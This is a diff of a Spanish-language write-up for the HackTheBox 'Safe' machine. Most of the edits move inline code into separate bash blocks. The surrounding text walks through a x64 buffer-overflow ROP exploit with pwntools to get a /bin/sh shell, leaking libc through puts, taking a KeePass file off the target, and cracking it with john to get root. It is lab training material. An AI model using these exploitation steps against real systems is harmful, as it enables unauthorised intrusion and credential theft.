@@ -73,16 +73,32 @@ Es un Apache 2.4.25 en un Debian y parece que sea la default page de apache2.
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.147`, Vemos la pagina por por defecto de apache2.
-Miramos el codigo fuente y vemos un commentario que dice `'myapp' can be dowloaded to analyse from here its running on port 1337`.
+Si entramos en la url 
+```bash
+ http://10.10.10.147 
+```
+, Vemos la pagina por por defecto de apache2.
+Miramos el codigo fuente y vemos un commentario que dice 
+```bash
+ 'myapp' can be dowloaded to analyse from here its running on port 1337 
+```
+.
 
-Si ponemos la url `http://10.10.10.147/myapp` podemos descargar la app y analyzarla.
+Si ponemos la url 
+```bash
+ http://10.10.10.147/myapp 
+```
+ podemos descargar la app y analyzarla.
 ## Vulnerability Assessment {-}
 
 
 ### Analysis de myapp {-}
 
-Si lanzamos la app descargada con el commando `./myapp` vemos la misma cosa que lo que hemos encontrado en el puerto 1337.
+Si lanzamos la app descargada con el commando 
+```bash
+ ./myapp 
+```
+ vemos la misma cosa que lo que hemos encontrado en el puerto 1337.
 Vamos a ver si esta app esta vulnerable a un Buffer Overflow
 
 ```bash
@@ -100,12 +116,28 @@ zsh: segmentation fault ./myapp
 
 ### Buffer Overflow x64 usando Gadgets {-}
 
-Primeramente vamos a analyzar el `myapp` con **Ghidra**.Lanzamos Ghidra, creamos un nuevo proyecto y importamos el binario `myapp`.
+Primeramente vamos a analyzar el 
+```bash
+ myapp 
+```
+ con **Ghidra**.Lanzamos Ghidra, creamos un nuevo proyecto y importamos el binario 
+```bash
+ myapp 
+```
+.
 Una vez importado, cojemos el binario y lo Drag & Dropeamos en el Dragon. Una vez cargado, nos pide si lo queremos analysar, le decimos que si.
 
 En la parte derecha de Ghidra, hay un panel Symbol Tree que nos permite ver las funcciones del programa, pinchamos a la function **main** y vemos 
-el codigo de esta funccion. Vemos que hay una variable `local_78` creada con un tamaño de 112 bits y que recupera la entrada de usuario con la 
-funccion `gets(local_78)` que es vulnerable a un BufferOverflow.
+el codigo de esta funccion. Vemos que hay una variable 
+```bash
+ local_78 
+```
+ creada con un tamaño de 112 bits y que recupera la entrada de usuario con la 
+funccion 
+```bash
+ gets(local_78) 
+```
+ que es vulnerable a un BufferOverflow.
 
 Aqui vamos a analysar mas en profundidad el binario con **gdb** con **gef**.
 
@@ -123,7 +155,11 @@ What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
-Aqui gdb nos saca un error y vemos que el `$rsp` esta sobre escito con lettras **A**
+Aqui gdb nos saca un error y vemos que el 
+```bash
+ $rsp 
+```
+ esta sobre escito con lettras **A**
 
 
 ![Safe-rs-A](/assets/images/Safe-rsp-A.png) 
@@ -148,7 +184,11 @@ Aqui seguimos la Guia normal de un BOF.
         aauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
         ```
 
-    - el programa peta una vez mas pero el valor del `$rsp` a cambiado. Miramos el offset con el commando
+    - el programa peta una vez mas pero el valor del 
+```bash
+ $rsp 
+```
+ a cambiado. Miramos el offset con el commando
 
         ```bash
         gef➤  pattern offset $rsp
@@ -221,7 +261,11 @@ La idea aqui seria de burlar la llamada a la funccion system("/usr/bin/uptime") 
 cambiando la cadena de texto "/usr/bin/uptime" con "/bin/sh" por ejemplo.
 
 Hay cosas que tenemos que tener en cuenta para hacer este processo. En 64bits, hay uno orden que tenemos que tener en cuenta durante la llamada a una funccion
-`rdi rci rdx rcx r8 r9`. Este order se llama **convencion de llamada**. Esto significa que los argumentos pasados por las funcciones estan almazenadas en uno
+
+```bash
+ rdi rci rdx rcx r8 r9 
+```
+. Este order se llama **convencion de llamada**. Esto significa que los argumentos pasados por las funcciones estan almazenadas en uno
 de estos registros y que siguen este orden.
 
 Lo comprobamos de la siguiente manera.
@@ -241,7 +285,11 @@ Lo comprobamos de la siguiente manera.
     p.recvuntil('What do you want me to echo back?')
     ```
 
-1. Lanzamos el script con el comando `python3 exploit.py`
+1. Lanzamos el script con el comando 
+```bash
+ python3 exploit.py 
+```
+
 1. En este punto estamos parados en el principio de la funccion main, y añadimos un breakpoint al call de la funccion system
 
     - lo buscamos en el listing de ghidra
@@ -259,7 +307,19 @@ Lo comprobamos de la siguiente manera.
         gef➤  si
         ```
 
-        el comando `b` significa Breakpoint, el comando `c` es para Continue y el `si` se puede traducir como siguiente instruccion.
+        el comando 
+```bash
+ b 
+```
+ significa Breakpoint, el comando 
+```bash
+ c 
+```
+ es para Continue y el 
+```bash
+ si 
+```
+ se puede traducir como siguiente instruccion.
         En este punto hemos llegado a la funccion system.
 
     - miramos lo que hay en el **rdi**
@@ -270,9 +330,17 @@ Lo comprobamos de la siguiente manera.
         0x402008:   "/usr/bin/update"
         ```
 
-        Aqui vemos que en el **rdi** esta la string correspondiendo al `/usr/bin/uptime` que es el comando que seria ejecutado por **system()**
+        Aqui vemos que en el **rdi** esta la string correspondiendo al 
+```bash
+ /usr/bin/uptime 
+```
+ que es el comando que seria ejecutado por **system()**
 
-Ahora que sabemos que el argumento pasado en la funccion **system()** tiene que ser previamente definida en el registro `rdi`, miramos de que manera
+Ahora que sabemos que el argumento pasado en la funccion **system()** tiene que ser previamente definida en el registro 
+```bash
+ rdi 
+```
+, miramos de que manera
 podemos tomar el control de este registro para poner el comando que queremos.
 
 Para hacer este truco, el Tito nos recomiendo en primer lugar inspeccionar el resto de funcciones existentes. Si lo miramos con **Ghidra** en el Symbol Tree,
@@ -284,9 +352,25 @@ vemos que hay una funccion que se llama test y que contiene las ejecuciones sigu
 
 programa como nosotros queremos.
 ![Safe-test-fct-isectio](/assets/images/Safe-test-fct-inspection.png) 
-Si miramos la funccion test, vemos que justo despues de la copia del `rsp` al `rdi`, hay un comando **JMP** que significa Jump al registro **R13** donde a dentro, existe
+Si miramos la funccion test, vemos que justo despues de la copia del 
+```bash
+ rsp 
+```
+ al 
+```bash
+ rdi 
+```
+, hay un comando **JMP** que significa Jump al registro **R13** donde a dentro, existe
 una direccion (por el momento desconocida).
-Aqui la idea seria cambiar lo que hay en el registro `R13` para injectarle la direccion de la function `system()`.
+Aqui la idea seria cambiar lo que hay en el registro 
+```bash
+ R13 
+```
+ para injectarle la direccion de la function 
+```bash
+ system() 
+```
+.
 
 Para hacer este truco, tenemos que pasar por Gadgets que seria un ropper en este caso. Podemos usar **gef** para buscar si existe un Gadget en este registro.
 
@@ -298,8 +382,24 @@ gef➤  ropper --search "pop r13"
     knitr::include_graphics("images/Safe-gadget-r13.png")
 ```
 
-Aqui vemos que tenemos un Gadget `pop r13; pop r14; pop r15;` y tenemos la direccion **401206**. Esto quiere decir que podemos meter la direction de **system()** en
-`r13` y por lo de `r14` y `r15`, pondremos un byte nullo.
+Aqui vemos que tenemos un Gadget 
+```bash
+ pop r13; pop r14; pop r15; 
+```
+ y tenemos la direccion **401206**. Esto quiere decir que podemos meter la direction de **system()** en
+
+```bash
+ r13 
+```
+ y por lo de 
+```bash
+ r14 
+```
+ y 
+```bash
+ r15 
+```
+, pondremos un byte nullo.
 ```python
 ![Safe-adet-r13](/assets/images/Safe-gadget-r13.png) 
 #!/usr/bin/python3
@@ -346,15 +446,27 @@ p.sendline(junk + bin_sh + pop_r13 + system_plt + null + null + test)
 p.interactive()
 ```
 
-Todas las direcciones de memoria se han buscado con el comando `objdump -D ./myapp | grep "system"` o para la direccion de test con el
-comando `objdump -D ./myapp | grep "test"`. Estos comandos se puenden usar porque le PIE esta desabilitado.
+Todas las direcciones de memoria se han buscado con el comando 
+```bash
+ objdump -D ./myapp | grep "system" 
+```
+ o para la direccion de test con el
+comando 
+```bash
+ objdump -D ./myapp | grep "test" 
+```
+. Estos comandos se puenden usar porque le PIE esta desabilitado.
 
 En este caso, que hace el script. El script nos permite finalmente ejecutar el applicativo con un flujo distincto para
 ganar accesso al systema. El flujo es el siguiente.
 
 1. Lanzamos el binario
 1. Introducimos 112 A (120 del offset menos los 8 bytes del comando "/bin/sh\x00") => 7 caracteres + 1 nullByte.
-1. Introducimos el commando `/bin/sh\x00`
+1. Introducimos el commando 
+```bash
+ /bin/sh\x00 
+```
+
 1. Apuntamos a la direccion del gadget
 1. Sobre escribimos el
     - r13 con la direccion de system
@@ -415,7 +527,11 @@ p.interactive()
 ```
 
 La idea aqui seria de hacer una llamad a nivel de systema para arastrar la direccion de **puts**. El objetivo detras de esto es poder leakear la direccion para
-poder computar la direccion de  **libc**. Esto no permiteria computar una direccion donde este una string de `/bin/sh`. 
+poder computar la direccion de  **libc**. Esto no permiteria computar una direccion donde este una string de 
+```bash
+ /bin/sh 
+```
+. 
 
 Esto se hace poniendo una direccion memoriaa una llamada de systema (esto nos dara un error)
 
@@ -433,11 +549,23 @@ Error Not found.
 
 y desde este error, aprovechar de recuperar la direccion de puts. Desde aqui podriamos encontrar todas la direcciones necessarias para ejecutar los comandos que queremos.
 Para encontrar las direcciones podemos usar la web de [nullbyte](https://libc.nullbyte.cat/?q=puts%3Af90&l=libc6_2.24-11%2Bdeb9u4_amd64), podemos encontrar todos
-los offsets de los comandos que queremos como el offset de la direccion de `system` y de la string `/bin/sh` basada por la direccion de puts.
+los offsets de los comandos que queremos como el offset de la direccion de 
+```bash
+ system 
+```
+ y de la string 
+```bash
+ /bin/sh 
+```
+ basada por la direccion de puts.
 
 - la direccion de libc seria la direccion de puts menos el offset de puts de la web
 - la direccion de system seria la direccion de libc mas el offset de system
-- la direccion de la string `/bin/sh` seria la direccion de libc mas el offset de str_bin_sh
+- la direccion de la string 
+```bash
+ /bin/sh 
+```
+ seria la direccion de libc mas el offset de str_bin_sh
 ## Vuln exploit & Gaining Access {-}
 
 ### Ganando accesso con un BOF x64 {-}
@@ -461,7 +589,11 @@ Ya tenemos la flag.
 ls /home/user
 ```
 
-Vemos un fichero `MyPassword.kdbx` y una serie de imagenes. Lo descargamos en nuestra maquina de atacante.
+Vemos un fichero 
+```bash
+ MyPassword.kdbx 
+```
+ y una serie de imagenes. Lo descargamos en nuestra maquina de atacante.
 
 - en la maquina victima
 
@@ -470,16 +602,32 @@ Vemos un fichero `MyPassword.kdbx` y una serie de imagenes. Lo descargamos en nu
     busybox httpd -f -p 8000
     ```
 
-- en la maquina de atacante descargamos con `wget` todas las imagenes y el fichero `MyPasswords.kdbx`
+- en la maquina de atacante descargamos con 
+```bash
+ wget 
+```
+ todas las imagenes y el fichero 
+```bash
+ MyPasswords.kdbx 
+```
 
-Intentamos abrir el ficher `MyPasswords.kdbx` con la utilidad **keepassxc**
+
+Intentamos abrir el ficher 
+```bash
+ MyPasswords.kdbx 
+```
+ con la utilidad **keepassxc**
 
 ```bash
 keepassxc MyPasswords.kdbx
 ```
 
 Vemos que nos pregunta por una contraseña pero vemos que hay un fichero clave que seria una de las imagenes.
-Podemos tratar de recuperar el hash del fichero con `keepass2john` pero tenemos que tener en cuenta que si hay un fichero
+Podemos tratar de recuperar el hash del fichero con 
+```bash
+ keepass2john 
+```
+ pero tenemos que tener en cuenta que si hay un fichero
 que esta utilizado como seguridad, tenemos que añadir el parametro -k.
 
 ```bash
@@ -496,7 +644,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
 Encontramos la contraseña con la imagen 0547. Si abrimos el keepassxc dando la imagen como keyfile y con la contraseña podemos entrar y vemos un directorio
 llamado Root Password
 
-ya podemos utilizar el comando `su root` y leer la flag.
+ya podemos utilizar el comando 
+```bash
+ su root 
+```
+ y leer la flag.
 
 
 
